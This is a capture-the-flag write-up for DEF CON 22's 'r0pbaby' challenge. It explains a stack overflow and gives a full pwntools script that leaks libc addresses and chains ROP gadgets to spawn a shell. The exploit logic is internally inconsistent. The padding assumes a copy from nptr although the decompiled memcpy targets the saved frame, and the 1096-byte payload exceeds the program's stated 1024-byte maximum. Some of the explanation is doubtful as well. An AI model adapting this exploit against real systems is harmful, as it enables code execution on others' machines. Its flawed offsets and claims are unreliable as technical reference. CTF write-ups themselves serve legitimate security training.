---
title: "DEF CON 22 CTF Qualifier: r0pbaby"
date: 2014-05-16
description: "DEF CON 22 CTF qualifier r0pbaby writeup: 64-bit ROP chain construction via shared library base leak, PLT/GOT traversal, and system() call"
tags: ["DEF CON", "CTF", "ROP", "64-bit", "pwn", "PLT", "GOT", "libc"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## checksec

```bash
[*] '/mnt/c/Users/user/Desktop/pwnable/pwn/baby/r0pbaby/r0pbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

PIE is enabled but there is no stack canary. NX is enabled, so we cannot execute shellcode on the stack — we need a ROP chain. Conveniently, the binary exposes menu options that leak both the libc base address and the address of any libc symbol.

## Program Execution

```bash
➜  r0pbaby ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007F12580B2500
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007F1257F0F410
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 4
Exiting.
```

The program opens `libc.so.6` via `dlopen`, then exposes three primitives:

- **Option 1** — prints the handle returned by `dlopen`, which is the libc base address
- **Option 2** — calls `dlsym` with a user-supplied symbol name, then prints the resolved address
- **Option 3** — reads up to 1024 bytes into `nptr` and copies them directly onto the stack via `memcpy`

## Source Analysis

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int num; // eax
  void *v4; // rax
  unsigned __int64 num_2; // r14
  int idx; // er13
  uint64_t length; // r12
  int data; // eax
  void *handle; // [rsp+8h] [rbp-448h]
  char nptr[1088]; // [rsp+10h] [rbp-440h] BYREF
  __int64 savedregs; // [rsp+450h] [rbp+0h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    ...
    if ( num != 3 )
      break;
    __printf_chk(1LL, "Enter bytes to send (max 1024): ");
    char_copy_B9A(nptr, 1024LL);
    num_2 = (int)strtol(nptr, 0LL, 10);
    if ( num_2 - 1 > 0x3FF )
    {
      puts("Invalid amount.");
    }
    else
    {
      ...
LABEL_22:
      memcpy(&savedregs, nptr, length);  // overflow here
    }
  }
  ...
}
```

The key vulnerability is in option 3. After reading a byte count from the user, the binary reads that many bytes into `nptr[1088]` and then calls:

```c
memcpy(&savedregs, nptr, length);
```

`savedregs` is at `[rbp+0]`, meaning it sits immediately at the saved RBP on the stack. The `nptr` buffer starts at `[rbp-0x440]` (1088 bytes before saved RBP). So writing more than 8 bytes past the start of `savedregs` overwrites the return address.

The binary is stripped, so we cannot use `nm` or a debugger symbol lookup to find the exact offset:

```bash
➜  r0pbaby nm r0pbaby
nm: r0pbaby: no symbols
```

We determine the offset empirically: `nptr` is at `[rbp-0x440]` and `savedregs` is at `[rbp+0]`, so from `nptr` to the saved return address is `0x440 + 8 = 0x448` (1096) bytes.

## Exploit Strategy

Since there is no stack canary and no ASLR protection for our own payload (we supply the exact addresses), the plan is:

1. Use option 1 to leak the libc base
2. Use option 2 to leak the address of `system` and find a `pop rdi ; ret` gadget inside libc
3. Use option 3 to write a ROP chain: `[padding] [pop rdi ; ret] ["/bin/sh" addr] [system addr]`

### Finding the gadget

We need `pop rdi ; ret` to set the first argument for `system`. Because PIE is enabled and the binary is stripped, we search libc directly:

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

At runtime the gadget address is `libc_base + pop_rdi_offset`.

## Exploit

```python
from pwn import *

p = process('./r0pbaby')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu(choice):
    p.recvuntil(': ')
    p.sendline(str(choice))

def get_libc_base():
    menu(1)
    p.recvuntil('libc.so.6: ')
    return int(p.recvline().strip(), 16)

def get_symbol(sym):
    menu(2)
    p.recvuntil('Enter symbol: ')
    p.sendline(sym)
    p.recvuntil('Symbol %s: ' % sym)
    return int(p.recvline().strip(), 16)

def send_rop(payload):
    menu(3)
    p.recvuntil('Enter bytes to send (max 1024): ')
    p.sendline(str(len(payload)))
    p.send(payload)

libc_base  = get_libc_base()
system     = get_symbol('system')
bin_sh     = libc_base + next(libc.search(b'/bin/sh'))

rop_libc   = ROP(libc)
pop_rdi    = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = libc_base + rop_libc.find_gadget(['ret'])[0]

# Offset from nptr to saved RIP: 0x440 (nptr size) + 8 (saved RBP)
padding = b'A' * (0x440 + 8)

payload  = padding
payload += p64(ret_gadget)   # stack alignment for system()
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

send_rop(payload)

p.interactive()
```

### Stack layout at the point of `memcpy`

```
[rsp]           → nptr[0]          ← start of our controlled data
...
[rbp-0x440]    → nptr[0]
[rbp+0x00]     → saved RBP        ← overwritten with 'AAAA....'
[rbp+0x08]     → saved RIP        ← overwritten with ret gadget
[rbp+0x10]     ← pop rdi ; ret
[rbp+0x18]     ← /bin/sh address
[rbp+0x20]     ← system()
```

## Summary

r0pbaby is a straightforward introduction to 64-bit ROP. The binary deliberately hands us both a libc base leak and symbol resolution, leaving only the stack write primitive and gadget chaining as the actual challenge. Key takeaways:

- `dlopen` handle == shared library load address, directly usable as a base
- `dlsym` resolves symbols at runtime, giving precise function addresses without ASLR brute force
- 64-bit calling convention requires the first argument in `rdi`; a `pop rdi ; ret` gadget is the standard setup
- Stack alignment to 16 bytes before calling `system` prevents `movaps` crashes in glibc
